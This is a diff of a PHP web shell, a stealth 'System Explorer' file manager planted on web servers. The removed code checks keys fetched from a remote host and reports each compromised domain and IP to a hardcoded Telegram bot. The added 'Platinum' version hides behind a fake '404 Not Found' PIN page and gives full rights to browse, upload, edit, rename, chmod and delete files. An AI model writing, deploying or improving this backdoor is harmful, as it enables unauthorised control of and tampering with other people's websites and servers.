@@ -1,58 +1,153 @@
 <?php
-@session_start();@set_time_limit(0);@error_reporting(0);
-if(isset($_GET["resmi"])){
-    while(ob_get_level()){ob_end_clean();}ob_start();
-    $bot="8446042299:AAHVoRIsQfUwg1rzvP5tJQuKOe4QF7BaUbM";
-    $cid="6664061200";
-    $rem="https://brankascapzcu.pages.dev/one.txt";
-    function g_c($u){
-        if(function_exists("curl_init")){$c=curl_init($u);curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);curl_setopt($c,CURLOPT_TIMEOUT,10);$d=curl_exec($c);curl_close($c);return $d;}
-        return @file_get_contents($u);
-    }
-    $c=g_c($rem);
-    if($c){
-        $keys=explode("\n",str_replace("\r","",$c));
-        if(in_array(trim($_GET["resmi"]),array_map('trim',$keys))){
-            $root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
-            $p = isset($_GET["path"]) ? $_GET["path"] : $root;
-            $p = str_replace("\\", "/", $p); $par = dirname($p);
-            if(!isset($_SESSION["sent_".$_GET["resmi"]])){
-                $msg="🚀 <b>Akses Berhasil!</b>\n🌐 <b>Domain:</b> ".$_SERVER["HTTP_HOST"]."\n📍 <b>IP:</b> ".$_SERVER["REMOTE_ADDR"];
-                g_c("https://api.telegram.org/bot$bot/sendMessage?chat_id=$cid&parse_mode=html&text=".urlencode($msg));
-                $_SESSION["sent_".$_GET["resmi"]]=true;
-            }
-            if(isset($_POST["exe"])){
-                $t=$p."/".$_POST["it_n"];
-                if($_POST["opt"]=="delete"){(is_dir($t))?@rmdir($t):@unlink($t);}
-                elseif($_POST["opt"]=="chmod"){@chmod($t,octdec($_POST["val"]));}
-                elseif($_POST["opt"]=="rename"){@rename($t,$p."/".$_POST["val"]);}
-                elseif($_POST["opt"]=="new_f"){@file_put_contents($p."/".$_POST["val"],"");}
-                header("Location: ?resmi=".$_GET["resmi"]."&path=".$p);exit;
-            }
-            if(isset($_FILES["f"])){@copy($_FILES["f"]["tmp_name"],$p."/".$_FILES["f"]["name"]);}
-            if(isset($_POST["s_e"])){@file_put_contents($_POST["ef"],$_POST["cnt"]);}
-            echo "<html><head><title>System Explorer</title><style>
-                body{background:#0a0a0a;color:#00ff00;font-family:'Segoe UI',sans-serif;padding:25px;line-height:1.6;}
-                a{color:#00ffff;text-decoration:none;font-weight:600;}
-                .box{border:1px solid #33ff33;padding:20px;max-width:1300px;margin:auto;}
-                .header{background:#1a1a1a;padding:20px;border-bottom:2px solid #33ff33;margin-bottom:20px;}
-                .path-box{font-size:15px;margin-top:12px;background:#000;padding:8px;border:1px solid #333;}
-                table{width:100%;border-collapse:collapse;margin-top:10px;font-size:14px;}
-                th{background:#33ff33;color:#000;padding:12px;}
-                td{border-bottom:1px solid #222;padding:10px;}
-                .btn{background:#33ff33;border:none;font-weight:bold;padding:7px 18px;cursor:pointer;color:#000;border-radius:3px;}
-                .p-white{color:#ffffff;} .p-green{color:#00ff00;} .p-red{color:#ff0000;font-weight:bold;} .p-normal{color:#aaaaaa;}
-                input,select,textarea{background:#000;color:#00ff00;border:1px solid #33ff33;padding:6px;}
-            </style></head><body><div class='box'><div class='header'><div style='display:flex;justify-content:space-between;align-items:center;'><strong style='font-size:22px;'>MANAGER V5.2</strong><a href='index.php' style='color:#ff3333;border:1px solid #ff3333;padding:4px 12px;'>EXIT</a></div><div class='path-box'><a href='?resmi=".$_GET["resmi"]."&path=$root' style='background:#ffff00;color:#000;padding:3px 8px;border-radius:3px;font-weight:bold;font-size:12px;'>ROOT HOME</a> &nbsp; PATH: ";
-            $ds = explode("/", $p); $acc = ""; foreach($ds as $idx => $d){ if($d=="" && $idx==0){ echo "<a href='?resmi=".$_GET["resmi"]."&path=/'>/</a>"; continue; } if($d=="") continue; $acc .= ($idx==0?"":"/").$d; echo "<a href='?resmi=".$_GET["resmi"]."&path=".$acc."'>".$d."</a>/"; }
-            echo "</div></div><div style='display:flex;gap:15px;margin-bottom:20px;'><a href='?resmi=".$_GET["resmi"]."&path=".$par."' class='btn' style='background:#444;color:#fff;'>↩ PREVIOUS</a><form method='POST' enctype='multipart/form-data'><input type='file' name='f'><input type='submit' value='UPLOAD' class='btn'></form></div><table><thead><tr><th>Name</th><th width='120'>Size</th><th width='100'>Perms</th><th width='320'>Action</th></tr></thead><tbody>";
-            foreach(scandir($p) as $v){ if($v=="." || $v=="..") continue; $tp="$p/$v"; $pr=substr(sprintf('%o',fileperms($tp)),-4); 
-            $cl="p-normal"; if($pr=="0555")$cl="p-white";elseif($pr=="0750"||$pr=="0755")$cl="p-green";elseif($pr=="0000"||$pr=="0111")$cl="p-red";
-            echo "<tr><td><a href='?resmi=".$_GET["resmi"]."&".(is_dir($tp)?"path=$tp":"edit=$tp&path=$p")."'>".(is_dir($tp)?"📁 ":"📄 ")."$v</a></td><td>".(is_dir($tp)?"DIR":round(filesize($tp)/1024,2)." KB")."</td><td align='center' class='$cl'>$pr</td><td><form method='POST' style='display:flex;gap:8px;'><input type='hidden' name='it_n' value='$v'><select name='opt'><option value='rename'>Rename</option><option value='chmod'>Chmod</option><option value='delete'>Delete</option></select><input type='text' name='val' size='10'><input type='submit' name='exe' value='OK' class='btn' style='padding:3px 10px; font-size:12px;'></form></td></tr>"; }
-            echo "</tbody></table></div>";
-            if(isset($_GET["edit"])){ echo "<br><div class='box'><form method='POST'><input type='hidden' name='ef' value='".$_GET["edit"]."'><textarea name='cnt' style='width:100%;height:500px;background:#000;color:#00ff00;border:1px solid #00ffff;'>".htmlspecialchars(file_get_contents($_GET["edit"]))."</textarea><input type='submit' name='s_e' value='SAVE CHANGES' class='btn' style='margin-top:15px;width:100%;height:45px;'></form></div>"; }
-            echo "</body></html>"; exit;
-        }
-    }
+/**
+ * PLATINUM FILE MANAGER V10 - GENERIC EDITION
+ * Optimized for GitHub & Professional Stealth
+ */
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+
+// --- CONFIGURATION ---
+$pin_akses = '070999';
+$key       = 'cuceng';
+
+// --- SECURITY GATE ---
+if (isset($_GET['exit'])) { unset($_SESSION['auth']); header("Location: ?resmi=$key"); exit; }
+if (isset($_POST['login_pin']) && $_POST['login_pin'] == $pin_akses) { $_SESSION['auth'] = md5($pin_akses); }
+
+if ($_SESSION['auth'] !== md5($pin_akses)) {
+    die("<html><head><title>404 Not Found</title><style>
+        body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
+        .l { border:1px solid #0f0; padding:40px; border-radius:5px; box-shadow:0 0 20px #0f0; }
+        input { background:#000; border:1px solid #0f0; color:#0f0; padding:10px; width:200px; text-align:center; }
+        button { background:#0f0; color:#000; border:none; padding:10px; cursor:pointer; font-weight:bold; }
+    </style></head><body>
+    <div class='l'><h3>[ SYSTEM LOCKED ]</h3><form method='POST'><input type='password' name='login_pin' placeholder='PIN' autofocus><br><br><button type='submit' style='width:100%'>UNLOCK</button></form></div>
+    </body></html>");
 }
+
+// --- FILE SYSTEM LOGIC ---
+$root = str_replace("\\", "/", $_SERVER['DOCUMENT_ROOT']);
+$p = isset($_GET["path"]) ? $_GET["path"] : $root;
+$p = str_replace("\\", "/", $p);
+
+// Actions Handler
+if(isset($_POST["act"])){
+    $target = $p . "/" . $_POST["name"];
+    $val = $_POST["val"];
+    switch($_POST["opt"]){
+        case 'del': (is_dir($target)) ? @rmdir($target) : @unlink($target); break;
+        case 'ren': @rename($target, $p . "/" . $val); break;
+        case 'chm': @chmod($target, octdec($val)); break;
+    }
+    header("Location: ?resmi=$key&path=$p"); exit;
+}
+
+// File/Folder Creator
+if(isset($_POST['mk'])){
+    if($_POST['type'] == 'dir') { @mkdir($p . "/" . $_POST['n']); }
+    else { @file_put_contents($p . "/" . $_POST['n'], $_POST['c']); }
+}
+
+// Upload Handler
+if(isset($_FILES["up"])){ @copy($_FILES["up"]["tmp_name"], $p . "/" . $_FILES["up"]["name"]); }
 ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>System Explorer - <?php echo $_SERVER['HTTP_HOST']; ?></title>
+    <style>
+        body { background:#0a0a0a; color:#00ff00; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin:0; padding:20px; }
+        .box { background:#111; border:1px solid #333; padding:20px; border-radius:8px; }
+        .head { display:flex; justify-content:space-between; border-bottom:1px solid #0f0; margin-bottom:15px; padding-bottom:10px; }
+        .path { color:#00ffff; margin-bottom:15px; font-size:14px; }
+        table { width:100%; border-collapse:collapse; }
+        th { background:#0f0; color:#000; padding:10px; text-align:left; }
+        td { padding:10px; border-bottom:1px solid #222; font-size:13px; }
+        tr:hover { background:#1a1a1a; }
+        .btn { background:#0f0; color:#000; border:none; padding:5px 12px; border-radius:3px; cursor:pointer; font-weight:bold; }
+        input, select { background:#000; color:#0f0; border:1px solid #444; padding:5px; }
+        .p-777 { color:#ff3333; font-weight:bold; }
+        .p-644 { color:#0f0; }
+        .p-444 { color:#aaa; }
+        a { color:inherit; text-decoration:none; }
+        a:hover { text-decoration:underline; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="head">
+            <strong>PLATINUM GENERIC V10</strong>
+            <span><a href="?resmi=<?php echo $key; ?>&exit" style="color:#ff3333;">[ LOGOUT ]</a></span>
+        </div>
+
+        <div class="path">
+            PATH: <?php echo $p; ?>
+        </div>
+
+        <div style="display:flex; gap:15px; margin-bottom:20px; flex-wrap:wrap;">
+            <form method="POST" enctype="multipart/form-data">
+                <input type="file" name="up"> <input type="submit" value="UPLOAD" class="btn">
+            </form>
+            <form method="POST">
+                <input type="hidden" name="type" value="dir">
+                <input type="text" name="n" placeholder="New Folder"> <input type="submit" name="mk" value="MKDIR" class="btn">
+            </form>
+        </div>
+
+        <table>
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th width="100">Size</th>
+                    <th width="100">Perms</th>
+                    <th width="300">Action</th>
+                </tr>
+            </thead>
+            <tbody>
+                <?php
+                $files = scandir($p);
+                foreach($files as $file) {
+                    if($file == "." || $file == "..") continue;
+                    $full = $p . "/" . $file;
+                    $perms = substr(sprintf('%o', fileperms($full)), -4);
+                    $sz = is_dir($full) ? "DIR" : round(filesize($full)/1024, 2) . " KB";
+                    $cls = "p-" . substr($perms, -3);
+
+                    echo "<tr>
+                        <td><a href='?resmi=$key&".(is_dir($full)?"path=$full":"edit=$full&path=$p")."'>".(is_dir($full)?"📁 ":"📄 ")."$file</a></td>
+                        <td>$sz</td>
+                        <td class='$cls'>$perms</td>
+                        <td>
+                            <form method='POST'>
+                                <input type='hidden' name='name' value='$file'>
+                                <select name='opt'>
+                                    <option value='ren'>Rename</option>
+                                    <option value='chm'>Chmod</option>
+                                    <option value='del'>Delete</option>
+                                </select>
+                                <input type='text' name='val' size='8'>
+                                <input type='submit' name='act' value='GO' class='btn' style='padding:2px 8px;'>
+                            </form>
+                        </td>
+                    </tr>";
+                }
+                ?>
+            </tbody>
+        </table>
+
+        <?php if(isset($_GET['edit'])): ?>
+        <div style="margin-top:30px; border-top:1px solid #0f0; padding-top:20px;">
+            <strong>EDITOR: <?php echo basename($_GET['edit']); ?></strong>
+            <form method="POST">
+                <input type="hidden" name="type" value="file">
+                <input type="hidden" name="n" value="<?php echo $_GET['edit']; ?>">
+                <textarea name="c" style="width:100%; height:400px; background:#000; color:#0f0; margin-top:10px; border:1px solid #333;"><?php echo htmlspecialchars(file_get_contents($_GET['edit'])); ?></textarea>
+                <input type="submit" name="mk" value="SAVE CHANGES" class="btn" style="width:100%; margin-top:10px;">
+            </form>
+        </div>
+        <?php endif; ?>
+    </div>
+</body>
+</html>
